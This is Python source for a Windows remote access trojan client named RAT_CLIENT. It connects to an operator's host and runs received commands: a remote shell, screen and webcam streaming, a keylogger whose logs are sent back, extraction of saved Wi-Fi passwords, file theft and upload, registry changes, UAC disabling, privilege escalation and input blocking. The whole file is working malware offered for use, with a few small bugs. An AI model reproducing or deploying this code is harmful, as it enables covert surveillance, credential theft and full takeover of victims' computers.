import subprocess
import os
import sys
import random
import socket
import platform
import ctypes
import shutil
import glob
import urllib.request
import json
import pyautogui
from pynput.keyboard import Listener
import time
import keyboard
from threading import Thread
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
from vidstream import ScreenShareClient, CameraClient
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())

    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)

    def execute(self):
        while True:
            command = s.recv(1024).decode()
            if command == 'shell':
                while 1:
                    command = s.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    if command == 'cd':
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()
            
            elif command == 'screenshare':
                try:
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    s.send("Impossible to get screen")
            
            elif command == 'webcam':
                try:
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    s.send("Impossible to get webcam")
            
            elif command == 'breakstream':
                pass

            elif command == 'list':
                pass

            elif command == 'geolocate':
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                s.send(link.encode())
            
            elif command == 'setvalue':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                key2 = s.recv(1024).decode()
                value = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    s.send("Value is set".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'delkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    s.send("Key is deleted".encode())
                except:
                    s.send("Impossible to delete key".encode())
            
            elif command == 'createkey':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    s.send("Key is created".encode())
                except:
                    s.send("Impossible to create key".encode())
            
            elif command == 'volumeup':
                try:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'volumedown':
                try:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif command == 'setwallpaper':
                pic = s.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    s.send("No such file")

            elif command == 'usbdrivers':
                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                s.send(p.encode())
            
            elif command == 'monitors':
                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                s.send(p.encode())

            elif command == 'sysinfo':
                sysinfo = str(f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif command[:7] == 'writein':
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'readfile':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif command[:7] == 'abspath':
                try:
                    path = os.path.abspath(command[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif command == 'pwd':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif command == 'portscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                s.send(output.encode())
            
            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())

            elif command == 'profiles':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s.send(output.encode())
            
            elif command == 'profilepswd':
                profile = s.recv(6000)
                profile = profile.decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command == 'systeminfo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif command == 'sendmessage':
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            
            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                s.send("Keyboard and mouse are disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                Thread(target=self.disable_keyboard, daemon=True).start()
                s.send("Keyboard is disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                Thread(target=self.disable_mouse, daemon=True).start()
                s.send("Mouse is disabled".encode())
            
            elif command == 'disableUAC':
                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                s.send("Mouse and keyboard are unblocked".encode())
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                s.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                s.send("Keyboard and mouse are enabled".encode())
                
            elif command == 'turnoffmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            
            elif command == 'turnonmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            
            elif command == 'extendrights':
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s.send(sending.encode())
            
            elif command == 'isuseradmin':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif command == 'keyscan_start':
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
            
            elif command == 'send_logs':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()
            
            elif command == 'stop_keylogger':
                s.send("The session of keylogger is terminated".encode())
            
            elif command == 'cpu_cores':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif command[:8] == 'editfile':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cp':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'mv':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cd':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif command == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif command == 'curpid':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif command == 'drivers':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                s.send(str(drives).encode())
            
            elif command[:4] == 'kill':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif command == 'disabletaskmgr':
                Thread(target=self.block_task_manager, daemon=True).start()
                s.send("Task Manager is disabled".encode())
            
            elif command == 'enabletaskmgr':
                s.send("Task Manager is enabled".encode())
            
            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif command[:9] == 'startfile':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'upload':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()

            elif command == 'help':
                helpinfo = '''
shell - open command prompt
dir - shows files in directory
cd [directory] - change directory
cd .. - go back one directory
pwd - shows the current directory
createfile [filename] - create file in directory
editfile [filename] [text] - add text to file
delfile [filename] - delete file in directory
startfile [filename] - start file in directory
readfile [filename] - read file in directory
abspath [filename] - get absolute path of file
ipconfig - shows ip configuration
localtime - shows local time
tasklist - shows all running tasks
kill [taskname] - terminate task by name
shutdown - shutdown the system
'''
                s.send(helpinfo.encode())

            else:
                output = subprocess.getoutput(command)
                s.send(output.encode())
                if not output:
                    self.errorsend()

    def keylogger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        try:
            f = open("keylogs.txt", 'a')
            f.write(str(key))
            f.close()
        except:
            pass

    def block_task_manager(self):
        ctypes.windll.user32.MessageBoxW(0, "Task Manager has been disabled by your administrator.", "Warning", 0x00000000 | 0x00000040)

    def disable_keyboard(self):
        user32.BlockInput(True)

    def disable_mouse(self):
        user32.mouse_event(0x0001, 0, 0, 0, 0)

    def disable_all(self):
        user32.BlockInput(True)
        user32.mouse_event(0x0001, 0, 0, 0, 0)

client = RAT_CLIENT('Changeme', Changeme)
client.build_connection()
client.execute()
